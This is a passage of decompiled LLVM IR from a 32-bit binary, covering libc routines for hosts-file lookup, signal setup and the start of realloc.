  %v10_8057f4f = icmp eq i8 %v2_8057f3b84, 10
  br i1 %v10_8057f4f, label %dec_label_pc_8057f37, label %dec_label_pc_8057f54

dec_label_pc_8057f54:                             ; preds = %dec_label_pc_8057f37, %dec_label_pc_8057f4f, %dec_label_pc_8057f3b.preheader
  %v0_8057f58.lcssa = phi i32 [ %v0_8057f1b.lcssa, %dec_label_pc_8057f3b.preheader ], [ %v0_8057f5882, %dec_label_pc_8057f4f ], [ %v1_8057f3a, %dec_label_pc_8057f37 ]
  %v1_8057f3b.lcssa = phi i8* [ %v1_8057f3b75, %dec_label_pc_8057f3b.preheader ], [ %v1_8057f3b83, %dec_label_pc_8057f4f ], [ %v1_8057f3b, %dec_label_pc_8057f37 ]
  %v4_8057f54 = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_8057f58 = load i8, i8* %v1_8057f3b.lcssa, align 1
  %v3_8057f58 = icmp eq i8 %v2_8057f58, 0
  br i1 %v3_8057f58, label %dec_label_pc_8057f64, label %dec_label_pc_8057f5d

dec_label_pc_8057f5d:                             ; preds = %dec_label_pc_8057f58.preheader, %dec_label_pc_8057f54
  %v0_8057f12 = phi i32 [ %v0_8057f58.lcssa, %dec_label_pc_8057f54 ], [ %v0_8057eda56, %dec_label_pc_8057f58.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_8057f54, %dec_label_pc_8057f54 ], [ 0, %dec_label_pc_8057f58.preheader ]
  %v7_8057f62 = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_8057f62, label %dec_label_pc_8057f64, label %dec_label_pc_8057f0e

dec_label_pc_8057f64:                             ; preds = %dec_label_pc_8057f54, %dec_label_pc_8057f5d, %dec_label_pc_8057f58.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_8057f58.preheader ], [ %v4_8057f54, %dec_label_pc_8057f54 ], [ %stack_var_-196.013, %dec_label_pc_8057f5d ]
  store i32 %tmp, i32* @edi, align 4
  %v0_8057f6b = load i32, i32* @esi, align 4
  store i32 1, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_805cfd3.322 to i32), i32* %stack_var_-216, align 4
  %v5_8057f78 = call i32 @__GI_strcoll(i8* %v4_8057f78, i32 ptrtoint ([11 x i8]* @global_var_805cfd3.322 to i32), i32 %v0_8057f6b, i32 %v0_8057f6b)
  store i32 %v5_8057f78, i32* @eax, align 4
  %v1_8057f80 = icmp eq i32 %v5_8057f78, 0
  br i1 %v1_8057f80, label %dec_label_pc_8057fa8.preheader, label %dec_label_pc_8057fb9

dec_label_pc_8057fa8.preheader:                   ; preds = %dec_label_pc_8057f64
  %v0_8057fa889 = load i32, i32* @esi, align 4
  %v5_8057fac98 = icmp slt i32 %v0_8057fa889, %stack_var_-196.0.lcssa
  br i1 %v5_8057fac98, label %dec_label_pc_8057fae.lr.ph, label %dec_label_pc_8057fb9

dec_label_pc_8057fae.lr.ph:                       ; preds = %dec_label_pc_8057fa8.preheader
  %v0_8057fae.pre = load i32, i32* @global_var_8067e60.232, align 32
  br label %dec_label_pc_8057fae

dec_label_pc_8057f86:                             ; preds = %dec_label_pc_8057fae
  %v2_8057f89 = mul i32 %v0_8057fa899, 4
  %v4_8057f89 = add i32 %v2_8057f89, %v3_8057f89
  %v5_8057f89 = inttoptr i32 %v4_8057f89 to i32*
  %v6_8057f89 = load i32, i32* %v5_8057f89, align 4
  %v1_8057f90 = add i32 %v0_8057fa899, 1
  store i32 %v1_8057f90, i32* @esi, align 4
  %v1_8057f91 = inttoptr i32 %v6_8057f89 to i8*
  %v2_8057f91 = call i32 @__GI_strdup(i8* %v1_8057f91)
  %v1_8057f99 = load i32, i32* @ebx, align 4
  %v2_8057f99 = mul i32 %v1_8057f99, 4
  %v3_8057f99 = add i32 %v2_8057f99, 134643284
  %v4_8057f99 = inttoptr i32 %v3_8057f99 to i32*
  store i32 %v2_8057f91, i32* %v4_8057f99, align 4
  %v0_8057fa0 = load i32, i32* @ebx, align 4
  %v1_8057fa0 = add i32 %v0_8057fa0, 1
  store i32 %v1_8057fa0, i32* @eax, align 4
  store i32 %v1_8057fa0, i32* @global_var_8067e60.232, align 32
  %v0_8057fa8 = load i32, i32* @esi, align 4
  %v5_8057fac = icmp slt i32 %v0_8057fa8, %stack_var_-196.0.lcssa
  br i1 %v5_8057fac, label %dec_label_pc_8057fae, label %dec_label_pc_8057fb9

dec_label_pc_8057fae:                             ; preds = %dec_label_pc_8057fae.lr.ph, %dec_label_pc_8057f86
  %v0_8057fae = phi i32 [ %v0_8057fae.pre, %dec_label_pc_8057fae.lr.ph ], [ %v1_8057fa0, %dec_label_pc_8057f86 ]
  %v0_8057fa899 = phi i32 [ %v0_8057fa889, %dec_label_pc_8057fae.lr.ph ], [ %v0_8057fa8, %dec_label_pc_8057f86 ]
  store i32 %v0_8057fae, i32* @ebx, align 4
  %v7_8057fb7 = icmp sgt i32 %v0_8057fae, 2
  br i1 %v7_8057fb7, label %dec_label_pc_8057fb9, label %dec_label_pc_8057f86

dec_label_pc_8057fb9:                             ; preds = %dec_label_pc_8057fa8.preheader, %dec_label_pc_8057f86, %dec_label_pc_8057fae, %dec_label_pc_8057f64
  %v0_8057fb9 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805cfde.323 to i32), i32* %stack_var_-216, align 4
  %v0_8057fc0 = load i32, i32* @edi, align 4
  %v4_8057fc1 = inttoptr i32 %v0_8057fc0 to i8*
  %v5_8057fc1 = call i32 @__GI_strcoll(i8* %v4_8057fc1, i32 ptrtoint ([7 x i8]* @global_var_805cfde.323 to i32), i32 %v0_8057fb9, i32 %v0_8057fb9)
  store i32 %v5_8057fc1, i32* @eax, align 4
  %v1_8057fc9 = icmp eq i32 %v5_8057fc1, 0
  br i1 %v1_8057fc9, label %dec_label_pc_805800b.preheader, label %dec_label_pc_8057fcd

dec_label_pc_8057fcd:                             ; preds = %dec_label_pc_8057fb9
  %v0_8057fcd = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805cfe5.324 to i32), i32* %stack_var_-216, align 4
  %v0_8057fd4 = load i32, i32* @edi, align 4
  %v4_8057fd5 = inttoptr i32 %v0_8057fd4 to i8*
  %v5_8057fd5 = call i32 @__GI_strcoll(i8* %v4_8057fd5, i32 ptrtoint ([7 x i8]* @global_var_805cfe5.324 to i32), i32 %v0_8057fcd, i32 %v0_8057fcd)
  %v1_8057fdd = icmp eq i32 %v5_8057fd5, 0
  br i1 %v1_8057fdd, label %dec_label_pc_805800b.preheader, label %dec_label_pc_805804e

dec_label_pc_805800b.preheader:                   ; preds = %dec_label_pc_8057fb9, %dec_label_pc_8057fcd
  %v0_805800b100 = load i32, i32* @global_var_8067e64.317, align 4
  %tmp43103 = icmp slt i32 %v0_805800b100, 1
  %tmp44104 = icmp eq i1 %tmp43103, false
  br i1 %tmp44104, label %dec_label_pc_8057fe3, label %dec_label_pc_8058014

dec_label_pc_8057fe3:                             ; preds = %dec_label_pc_805800b.preheader, %dec_label_pc_8057fe3.dec_label_pc_8057fe3_crit_edge
  %v0_805800b105 = phi i32 [ %v0_805800b, %dec_label_pc_8057fe3.dec_label_pc_8057fe3_crit_edge ], [ %v0_805800b100, %dec_label_pc_805800b.preheader ]
  %v1_8057fe3 = add i32 %v0_805800b105, -1
  %v1_8057fe7 = mul i32 %v1_8057fe3, 4
  %v2_8057fe7 = add i32 %v1_8057fe7, 134643268
  %v3_8057fe7 = inttoptr i32 %v2_8057fe7 to i32*
  %v4_8057fe7 = load i32, i32* %v3_8057fe7, align 4
  store i32 %v1_8057fe3, i32* @global_var_8067e64.317, align 4
  %v1_8057ff3 = call i32 @free(i32 %v4_8057fe7)
  %v0_8057ff8 = load i32, i32* @global_var_8067e64.317, align 4
  %v1_8058000 = mul i32 %v0_8057ff8, 4
  %v2_8058000 = add i32 %v1_8058000, ptrtoint (i32* @global_var_8067e44.325 to i32)
  %v3_8058000 = inttoptr i32 %v2_8058000 to i32*
  store i32 0, i32* %v3_8058000, align 4
  %v0_805800b = load i32, i32* @global_var_8067e64.317, align 4
  %tmp43 = icmp slt i32 %v0_805800b, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_8057fe3.dec_label_pc_8057fe3_crit_edge, label %dec_label_pc_8058014

dec_label_pc_8057fe3.dec_label_pc_8057fe3_crit_edge: ; preds = %dec_label_pc_8057fe3
  br label %dec_label_pc_8057fe3

dec_label_pc_8058014:                             ; preds = %dec_label_pc_8057fe3, %dec_label_pc_805800b.preheader
  %v0_805800b.lcssa = phi i32 [ %v0_805800b100, %dec_label_pc_805800b.preheader ], [ %v0_805800b, %dec_label_pc_8057fe3 ]
  store i32 1, i32* @esi, align 4
  %v5_8058041115 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_8058041115, label %dec_label_pc_8058043, label %dec_label_pc_805804e

dec_label_pc_805801b:                             ; preds = %dec_label_pc_8058043
  %v2_805801e = mul i32 %v0_8058025117, 4
  %v4_805801e = add i32 %v2_805801e, %v3_8057f89
  %v5_805801e = inttoptr i32 %v4_805801e to i32*
  %v6_805801e = load i32, i32* %v5_805801e, align 4
  %v1_8058025 = add i32 %v0_8058025117, 1
  store i32 %v1_8058025, i32* @esi, align 4
  %v1_8058026 = inttoptr i32 %v6_805801e to i8*
  %v2_8058026 = call i32 @__GI_strdup(i8* %v1_8058026)
  %v1_805802e = load i32, i32* @ebx, align 4
  %v2_805802e = mul i32 %v1_805802e, 4
  %v3_805802e = add i32 %v2_805802e, 134643268
  %v4_805802e = inttoptr i32 %v3_805802e to i32*
  store i32 %v2_8058026, i32* %v4_805802e, align 4
  %v0_8058035 = load i32, i32* @ebx, align 4
  %v1_8058035 = add i32 %v0_8058035, 1
  store i32 %v1_8058035, i32* @global_var_8067e64.317, align 4
  %v0_805803d.pre = load i32, i32* @esi, align 4
  %v5_8058041 = icmp slt i32 %v0_805803d.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8058041, label %dec_label_pc_8058043, label %dec_label_pc_805804e

dec_label_pc_8058043:                             ; preds = %dec_label_pc_8058014, %dec_label_pc_805801b
  %v0_8058025117 = phi i32 [ %v0_805803d.pre, %dec_label_pc_805801b ], [ 1, %dec_label_pc_8058014 ]
  %v0_8058043116 = phi i32 [ %v1_8058035, %dec_label_pc_805801b ], [ %v0_805800b.lcssa, %dec_label_pc_8058014 ]
  store i32 %v0_8058043116, i32* @ebx, align 4
  %v7_805804c = icmp sgt i32 %v0_8058043116, 3
  br i1 %v7_805804c, label %dec_label_pc_805804e, label %dec_label_pc_805801b

dec_label_pc_805804e:                             ; preds = %dec_label_pc_8057edb.preheader, %dec_label_pc_8057eda, %dec_label_pc_8058014, %dec_label_pc_8058043, %dec_label_pc_805801b, %dec_label_pc_8057fcd, %dec_label_pc_8057efc, %dec_label_pc_8057ef3, %dec_label_pc_805804e.preheader
  %v0_805804e = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8058055, i32* @ebx, align 4
  %v3_805805a = call i32 @fgets(i32 %v2_8058055, i32 128, i32 %v0_805804e)
  %v1_8058062 = icmp eq i32 %v3_805805a, 0
  %v1_8058064 = icmp eq i1 %v1_8058062, false
  br i1 %v1_8058064, label %dec_label_pc_8057edb.preheader, label %dec_label_pc_805806a

dec_label_pc_8057edb.preheader:                   ; preds = %dec_label_pc_805804e
  %v0_8057edb.pre = load i32, i32* @ebx, align 4
  %v4_8057edb.pre = load i32, i32* @ecx, align 4
  %v1_8057edb49 = inttoptr i32 %v0_8057edb.pre to i8*
  %v2_8057edb50 = load i8, i8* %v1_8057edb49, align 1
  %v3_8057edb51 = zext i8 %v2_8057edb50 to i32
  %v5_8057edb52 = and i32 %v4_8057edb.pre, -256
  %v6_8057edb53 = or i32 %v3_8057edb51, %v5_8057edb52
  store i32 %v6_8057edb53, i32* @ecx, align 4
  %v4_8057edd54 = icmp eq i8 %v2_8057edb50, 0
  br i1 %v4_8057edd54, label %dec_label_pc_805804e, label %dec_label_pc_8057ee5.lr.ph

dec_label_pc_8057ee5.lr.ph:                       ; preds = %dec_label_pc_8057edb.preheader
  %v0_8057ee5.pre = load i32, i32* @global_var_8062dc0, align 64
  br label %dec_label_pc_8057ee5

dec_label_pc_805806a:                             ; preds = %dec_label_pc_805804e
  %v0_805806d = load i32, i32* @ebp, align 4
  %v1_805806e = inttoptr i32 %v0_805806d to i16*
  %v2_805806e = call i32 @__GI_fclose(i16* %v1_805806e)
  br label %dec_label_pc_8058083

dec_label_pc_8058078:                             ; preds = %dec_label_pc_8057eb7
  %v0_8058078 = call i32 @__GI___h_errno_location()
  %v1_805807d = inttoptr i32 %v0_8058078 to i32*
  store i32 3, i32* %v1_805807d, align 4
  br label %dec_label_pc_8058083

dec_label_pc_8058083:                             ; preds = %entry, %dec_label_pc_805806a, %dec_label_pc_8058078
  store i32 1, i32* %stack_var_-216, align 4
  %v3_805808f = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v0_8057e5e, i32* @esi, align 4
  store i32 %v0_8057e5d, i32* @edi, align 4
  store i32 %v0_8057e5c, i32* @ebp, align 4
  ret i32 %v3_805808f

; uselistorder directives
  uselistorder i32 %v0_8057ee5.pre, { 1, 0 }
  uselistorder i32 %v6_8057edb53, { 1, 0 }
  uselistorder i8 %v2_8057edb50, { 1, 2, 0 }
  uselistorder i8* %v1_8057edb49, { 1, 0 }
  uselistorder i32 %v0_8057edb.pre, { 1, 0 }
  uselistorder i32 %v0_805800b, { 0, 2, 1 }
  uselistorder i32 %v0_8057fae, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8057f46, { 1, 0 }
  uselistorder i32 %v2_8057f27, { 1, 0 }
  uselistorder i32 %v1_8057f1b, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8057eea, { 1, 0 }
  uselistorder i32 %v1_8057eda, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_8067e64.317, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 164, { 3, 0, 1, 2, 4 }
  uselistorder i32* @global_var_8067e60.232, { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8062de8.231 to i32), { 3, 1, 5, 6, 7, 8, 9, 10, 0, 4, 11, 2 }
  uselistorder label %dec_label_pc_8058083, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805804e, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_8058043, { 1, 0 }
  uselistorder label %dec_label_pc_8057fe3, { 1, 0 }
  uselistorder label %dec_label_pc_805800b.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8057fb9, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8057fae, { 1, 0 }
  uselistorder label %dec_label_pc_8057f64, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057f5d, { 1, 0 }
  uselistorder label %dec_label_pc_8057f54, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057f41, { 1, 0 }
  uselistorder label %dec_label_pc_8057f22, { 1, 0 }
  uselistorder label %dec_label_pc_805804e.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_80580c3 = inttoptr i32 %arg3 to i32*
  %v10_80580c3 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_80580c3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_80580c3
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_80580cc = load i32, i32* @ebx, align 4
  %v15_80580cd = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_80580e1 = icmp eq i32 %arg2, -1
  br i1 %v10_80580e1, label %dec_label_pc_80580ef, label %dec_label_pc_80580e6

dec_label_pc_80580e6:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_80580ef, label %dec_label_pc_80580ea

dec_label_pc_80580ea:                             ; preds = %dec_label_pc_80580e6
  %v7_80580ed = icmp sgt i32 %arg1, 64
  br i1 %v7_80580ed, label %dec_label_pc_80580ef, label %dec_label_pc_80580fc

dec_label_pc_80580ef:                             ; preds = %dec_label_pc_80580ea, %dec_label_pc_80580e6, %entry
  %v1_80580ef = call i32 @__errno_location(i32 %v0_80580cc)
  store i32 %v1_80580ef, i32* %eax.global-to-local, align 4
  %v1_80580f4 = inttoptr i32 %v1_80580ef to i32*
  store i32 22, i32* %v1_80580f4, align 4
  br label %dec_label_pc_8058170

dec_label_pc_80580fc:                             ; preds = %dec_label_pc_80580ea
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805810a

dec_label_pc_805810a:                             ; preds = %dec_label_pc_805810a.dec_label_pc_805810a_crit_edge, %dec_label_pc_80580fc
  %v0_805810a = phi i32 [ %v15_80580cd, %dec_label_pc_80580fc ], [ %v0_805810a.pre, %dec_label_pc_805810a.dec_label_pc_805810a_crit_edge ]
  %v1_805811517 = phi i32 [ 31, %dec_label_pc_80580fc ], [ %v1_8058115, %dec_label_pc_805810a.dec_label_pc_805810a_crit_edge ]
  %v2_805810a = mul i32 %v1_805811517, 4
  %v3_805810a = add i32 %v2_805810a, 160
  %v4_805810a = add i32 %v3_805810a, %v0_805810a
  %v5_805810a = inttoptr i32 %v4_805810a to i32*
  store i32 0, i32* %v5_805810a, align 4
  %v0_8058115.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8058115 = add i32 %v0_8058115.pre, -1
  %v9_8058115 = icmp slt i32 %v1_8058115, 0
  store i32 %v1_8058115, i32* %eax.global-to-local, align 4
  %v1_8058116 = icmp eq i1 %v9_8058115, false
  br i1 %v1_8058116, label %dec_label_pc_805810a.dec_label_pc_805810a_crit_edge, label %dec_label_pc_8058118

dec_label_pc_805810a.dec_label_pc_805810a_crit_edge: ; preds = %dec_label_pc_805810a
  %v0_805810a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805810a

dec_label_pc_8058118:                             ; preds = %dec_label_pc_805810a
  %v0_8058118 = load i32, i32* @edx, align 4
  %v2_805811b = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_805811b, i32* %eax.global-to-local, align 4
  %v4_8058123 = call i32 @__sigaddset(i32 %v2_805811b, i32 %arg1, i32 %v0_8058118, i32 %v0_8058118)
  store i32 %v4_8058123, i32* %eax.global-to-local, align 4
  %v2_805812b = icmp slt i32 %v4_8058123, 0
  br i1 %v2_805812b, label %dec_label_pc_8058170, label %dec_label_pc_805812f

dec_label_pc_805812f:                             ; preds = %dec_label_pc_8058118
  %v4_8058137 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_8067e80.326 to i32), i32 %arg1, i32 %v4_8058123, i32 %v4_8058123)
  %v2_8058150 = ptrtoint i32* %stack_var_-284 to i32
  %v2_8058155 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8058155, i32* %eax.global-to-local, align 4
  %v4_805815e = call i32 @__GI_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8058150)
  store i32 %v4_805815e, i32* %eax.global-to-local, align 4
  %v2_8058166 = icmp slt i32 %v4_805815e, 0
  br i1 %v2_8058166, label %dec_label_pc_8058170, label %dec_label_pc_805816a

dec_label_pc_805816a:                             ; preds = %dec_label_pc_805812f
  %v3_805816a = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_8058173

dec_label_pc_8058170:                             ; preds = %dec_label_pc_805812f, %dec_label_pc_8058118, %dec_label_pc_80580ef
  br label %dec_label_pc_8058173

dec_label_pc_8058173:                             ; preds = %dec_label_pc_805816a, %dec_label_pc_8058170
  %storemerge = phi i32 [ -1, %dec_label_pc_8058170 ], [ %v3_805816a, %dec_label_pc_805816a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80580cc, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8058115, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7 }
  uselistorder i32 (i32, i32*, i32)* @__GI_sigaction, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 1, 0, 4 }
  uselistorder i32 160, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_8058173, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp8 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_805817c = load i32, i32* @ebp, align 4
  %v0_805817d = load i32, i32* @edi, align 4
  %v0_805817e = load i32, i32* @esi, align 4
  %v0_805817f = load i32, i32* @ebx, align 4
  %v4_8058183 = icmp eq i32* %arg1, null
  store i32 %arg2, i32* @ebx, align 4
  %v1_805818c = icmp eq i1 %v4_8058183, false
  br i1 %v1_805818c, label %dec_label_pc_805819e, label %dec_label_pc_805818e

dec_label_pc_805818e:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_8058192 = call i32 @malloc(i32 %arg2)
  store i32 %v1_8058192, i32* %eax.global-to-local, align 4
  store i32 %v1_8058192, i32* @ebx, align 4
  br label %dec_label_pc_80584a5

dec_label_pc_805819e:                             ; preds = %entry
  %v1_805819e = icmp eq i32 %arg2, 0
  %v1_80581a0 = icmp eq i1 %v1_805819e, false
  br i1 %v1_80581a0, label %dec_label_pc_80581b3, label %dec_label_pc_80581a2

dec_label_pc_80581a2:                             ; preds = %dec_label_pc_805819e
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_80581a9 = call i32 @free(i32 %tmp8)
  store i32 %v1_80581a9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80584a5

dec_label_pc_80581b3:                             ; preds = %dec_label_pc_805819e
  %v2_80581be = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80581be, i32* %eax.global-to-local, align 4
  store i32 %v2_80581be, i32* %stack_var_-60, align 4
  %v4_80581c3 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134541533, i32 ptrtoint (i32* @global_var_8062cb0.166 to i32))
  store i32 %v4_80581c3, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8062cb0.166 to i32), i32* %stack_var_-60, align 4
  %v1_80581cf = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062cb0.166 to i32))
  store i32 %v1_80581cf, i32* %eax.global-to-local, align 4
  %v0_80581d7 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_80581d7, -32
  br i1 %tmp, label %dec_label_pc_80581ee, label %dec_label_pc_80581dc

dec_label_pc_80581dc:                             ; preds = %dec_label_pc_80581b3
  %v0_80581dc = load i32, i32* %stack_var_-60, align 4
  %v1_80581dc = call i32 @__errno_location(i32 %v0_80581dc)
  store i32 %v1_80581dc, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_80581e3 = inttoptr i32 %v1_80581dc to i32*
  store i32 12, i32* %v1_80581e3, align 4
  br label %dec_label_pc_80584a8

dec_label_pc_80581ee:                             ; preds = %dec_label_pc_80581b3
  %v1_80581ee = add i32 %v0_80581d7, 11
  %tmp22 = icmp ult i32 %v1_80581ee, 16
  br i1 %tmp22, label %dec_label_pc_8058205, label %dec_label_pc_80581fe

dec_label_pc_80581fe:                             ; preds = %dec_label_pc_80581ee
  %v1_80581fe = and i32 %v1_80581ee, -8
  br label %dec_label_pc_8058205

dec_label_pc_8058205:                             ; preds = %dec_label_pc_80581ee, %dec_label_pc_80581fe
  %stack_var_-40.0 = phi i32 [ %v1_80581fe, %dec_label_pc_80581fe ], [ 16, %dec_label_pc_80581ee ]
  %storemerge21 = phi i32 [ %v1_80581fe, %dec_label_pc_80581fe ], [ %v1_80581ee, %dec_label_pc_80581ee ]
  store i32 %storemerge21, i32* %eax.global-to-local, align 4
  %v1_8058209 = add i32 %tmp8, -8
  store i32 %v1_8058209, i32* @edi, align 4
  %v1_805820c = add i32 %tmp8, -4
  %v2_805820c = inttoptr i32 %v1_805820c to i32*
  %v3_805820c = load i32, i32* %v2_805820c, align 4
  store i32 %v3_805820c, i32* %edx.global-to-local, align 4
  %v1_8058211 = and i32 %v3_805820c, -4
  store i32 %v1_8058211, i32* %eax.global-to-local, align 4
  %v2_8058214 = and i32 %v3_805820c, 2
  %v3_8058214 = icmp eq i32 %v2_8058214, 0
  %v1_805821b = icmp eq i1 %v3_8058214, false
  br i1 %v1_805821b, label %dec_label_pc_80583b5, label %dec_label_pc_8058221

dec_label_pc_8058221:                             ; preds = %dec_label_pc_8058205
  store i32 %stack_var_-40.0, i32* @ecx, align 4
  store i32 %v1_8058211, i32* @ebx, align 4
  %v7_8058227 = icmp ult i32 %v1_8058211, %stack_var_-40.0
  %v1_8058229 = icmp eq i1 %v7_8058227, false
  br i1 %v1_8058229, label %dec_label_pc_8058360, label %dec_label_pc_805822f

dec_label_pc_805822f:                             ; preds = %dec_label_pc_8058221
  %v2_805822f = add i32 %v1_8058211, %v1_8058209
  store i32 %v2_805822f, i32* @esi, align 4
  %v1_8058232 = load i32, i32* @global_var_8067a4c.235, align 4
  %v12_8058232 = icmp eq i32 %v2_805822f, %v1_8058232
  %v1_8058238 = icmp eq i1 %v12_8058232, false
  %v1_8058272 = add i32 %v2_805822f, 4
  %v2_8058272 = inttoptr i32 %v1_8058272 to i32*
  %v3_8058272 = load i32, i32* %v2_8058272, align 4
  br i1 %v1_8058238, label %dec_label_pc_8058272, label %dec_label_pc_805823a

dec_label_pc_805823a:                             ; preds = %dec_label_pc_805822f
  %v1_805823f = and i32 %v3_8058272, -4
  %v2_8058242 = add i32 %v1_805823f, %v1_8058211
  store i32 %v2_8058242, i32* @ecx, align 4
  %v1_8058248 = add i32 %stack_var_-40.0, 16
  store i32 %v1_8058248, i32* %eax.global-to-local, align 4
  %v7_805824b = icmp ult i32 %v2_8058242, %v1_8058248
  br i1 %v7_805824b, label %dec_label_pc_80582b0, label %dec_label_pc_805824f

dec_label_pc_805824f:                             ; preds = %dec_label_pc_805823a
  %v1_805824f = urem i32 %v3_805820c, 2
  %v5_8058252 = or i32 %v1_805824f, %stack_var_-40.0
  store i32 %v5_8058252, i32* %edx.global-to-local, align 4
  store i32 %v5_8058252, i32* %v2_805820c, align 4
  %v0_805825d = load i32, i32* @ecx, align 4
  %v2_805825d = sub i32 %v0_805825d, %stack_var_-40.0
  %v0_805825f = load i32, i32* @edi, align 4
  %v2_805825f = add i32 %v0_805825f, %stack_var_-40.0
  store i32 %v2_805825f, i32* %eax.global-to-local, align 4
  %v1_8058262 = or i32 %v2_805825d, 1
  store i32 %v1_8058262, i32* @ecx, align 4
  store i32 %v2_805825f, i32* @global_var_8067a4c.235, align 4
  %v2_805826a = add i32 %v2_805825f, 4
  %v3_805826a = inttoptr i32 %v2_805826a to i32*
  store i32 %v1_8058262, i32* %v3_805826a, align 4
  br label %dec_label_pc_8058493

dec_label_pc_8058272:                             ; preds = %dec_label_pc_805822f
  store i32 %v3_8058272, i32* %edx.global-to-local, align 4
  %v1_8058277 = and i32 %v3_8058272, -2
  store i32 %v1_8058277, i32* %eax.global-to-local, align 4
  %v3_805827a = add i32 %v1_8058272, %v1_8058277
  %v4_805827a = inttoptr i32 %v3_805827a to i8*
  %v5_805827a = load i8, i8* %v4_805827a, align 1
  %v6_805827a = urem i8 %v5_805827a, 2
  %v7_805827a = icmp eq i8 %v6_805827a, 0
  %v1_805827f = icmp eq i1 %v7_805827a, false
  br i1 %v1_805827f, label %dec_label_pc_80582b0, label %dec_label_pc_8058281

dec_label_pc_8058281:                             ; preds = %dec_label_pc_8058272
  %v1_8058285 = and i32 %v3_8058272, -4
  store i32 %v1_8058285, i32* %edx.global-to-local, align 4
  %v2_8058288 = add i32 %v1_8058285, %v1_8058211
  store i32 %v2_8058288, i32* @ebx, align 4
  %v10_805828a = icmp ult i32 %v2_8058288, %stack_var_-40.0
  br i1 %v10_805828a, label %dec_label_pc_80582b0, label %dec_label_pc_8058290

dec_label_pc_8058290:                             ; preds = %dec_label_pc_8058281
  %v1_8058290 = add i32 %v1_8058211, %tmp8
